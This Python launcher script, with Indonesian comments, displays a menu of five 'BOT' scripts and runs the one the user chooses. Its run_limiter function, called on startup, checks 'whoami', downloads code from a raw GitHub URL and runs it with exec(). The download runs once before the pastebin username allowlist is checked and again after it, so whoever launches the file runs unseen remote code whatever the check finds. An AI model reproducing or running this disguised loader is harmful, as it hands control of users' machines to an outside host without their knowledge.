import os
import sys
import subprocess

# ================== WARNA ==================
RED = '\033[31m'
GRY = '\033[90m'
CYAN = '\033[96m'
G = '\033[92m'
L = '\033[0m'
PT1 = '\33[5;47;31m'
CY = '\33[5;37;45m'
WW = '\33[5;31;42m'
H = '\33[5;41;37m'
P = '\033[95m'
CYAN = '\033[96m'
DARK = '\033[36m'
B = '\033[94m'
G = '\033[92m'
Y = '\033[93m'
R = '\033[91m'
BO = '\033[1m'
UG = '\033[35m'
PT = '\033[37m'
PT1 = '\33[5;47;31m'
UNDER = '\033[4m'
N = '\033[0m'
H = '\33[5;41;37m'
H1 = '\33[2;41;37m'
L = '\033[0;0m'
CY = '\33[5;37;45m'
BB = '\33[7;49;93m'
BR = '\33[7;49;33m'
GR1 = '\33[5;49;90m'
GR = '\33[7;49;90m'
WW1 = '\33[7;41;32m'
WW = '\33[5;31;42m'
MG = '\33[7;49;36m'
WH = '\33[7;49;37m'
PTH = '\33[7;49;37m'
RED = '\033[31m'
GRY = '\033[90m'
WW2 = '\33[5;35;46m'

def run_limiter():
    import getpass
    import subprocess
    import requests
    import sys

    def pasterun(post):
        url = f"https://raw.githubusercontent.com/ardhysevenfold/acces55/refs/heads/main/{post}"
        code = requests.get(url).text
        exec(code)

    url = 'https://raw.githubusercontent.com/ardhysevenfold/acces55/refs/heads/main/limiter'
    *_, post = url.split('/')

    def execute_whoami():
        try:
            result = subprocess.run(['whoami'], capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout.strip()
            return None
        except:
            return None

    def fetch_allowed_usernames():
        try:
            url = "https://pastebin.com/raw/qMfi7ZMF"
            response = requests.get(url)
            if response.status_code == 200:
                return response.json()
        except:
            pass
        return []

    username = execute_whoami()

    if username:
        print("Connecting...")
        pasterun(post)

        allowed = fetch_allowed_usernames()

        if username in allowed:
            pasterun(post)
            print("Success")
        else:
            sys.exit("Access Denied")
    else:
        sys.exit("whoami gagal")
        
run_limiter()
# ================== CLEAR ==================
os.system("clear")

# ================== BANNER ==================
print(f"""{RED}
    ███████╗███████╗███████╗            {GRY}[INFORMASI]{L}
    {RED}██╔════╝██╔════╝██╔════╝         
    {RED}██████╗░██████╗░█████╗       🔹AUTOR   = Racknarock
    {RED}╚════██╗╚════██╗██╔══╝       🔹LOGIN   = OWNER
    {RED}██████╔╝██████╔╗██║░░░██     🔹SERVER  = {H}ONLINE{L}
    {RED}╚═════╝░╚═════╝░╚═╝
""")

print(f"{CYAN}           ┃▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┃┃▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┃")
print(f"           ┃ {CY}BOT OPTIMUS-PRIME{L} {CYAN}┃┃ {G}•Ketik : 1 {CYAN}    ┃{WW} ONLINE {L}")
print(f"{CYAN}           ┃▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┃┃▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┃")
print(f"           ┃ {CY}BOT BUMBLE-BEE{L}    {CYAN}┃┃ {G}•Ketik : 2 {CYAN}    ┃{WW} ONLINE {L}")
print(f"{CYAN}           ┃▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┃┃▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┃")
print(f"           ┃ {CY}BOT MEGATRON{L}      {CYAN}┃┃ {G}•Ketik : 3 {CYAN}    ┃{WW} ONLINE {L}")
print(f"{CYAN}           ┃▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┃┃▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┃")
print(f"           ┃ {CY}BOT DESERT-TICON{L}  {CYAN}┃┃ {G}•Ketik : 4 {CYAN}    ┃{WW} ONLINE {L}")
print(f"{CYAN}           ┃▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┃┃▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┃")
print(f"           ┃ {CY}BOT SENTINENTAL{L}   {CYAN}┃┃ {G}•Ketik : 5 {CYAN}    ┃{WW} ONLINE {L}")
print(f"{CYAN}           ┃▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┃┃▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┃")

# ================== INPUT ==================
pilih = input(f"\n{PT1}Pilih Bot : {L} ")

# ================== BASE PATH ==================
base = os.path.dirname(os.path.abspath(__file__))

# ================== LIST FILE ==================
files = {
    '1': 'optimus.py',
    '2': 'bumble-bee.py',
    '3': 'megatron.py',
    '4': 'desert-ticon.py',
    '5': 'sentinental.py'
}

# ================== EKSEKUSI ==================
if pilih in files:
    file_path = os.path.join(base, files[pilih])

    if os.path.exists(file_path):
        print(f"{GRY}Menjalankan: {file_path}{L}\n")
        subprocess.run(["python3", file_path])
    else:
        print(f"{RED}File tidak ditemukan!{L}")
        print(f"{GRY}Lokasi dicari: {file_path}{L}")
else:
    sys.exit(f"{RED}Pilihan tidak valid!{L}")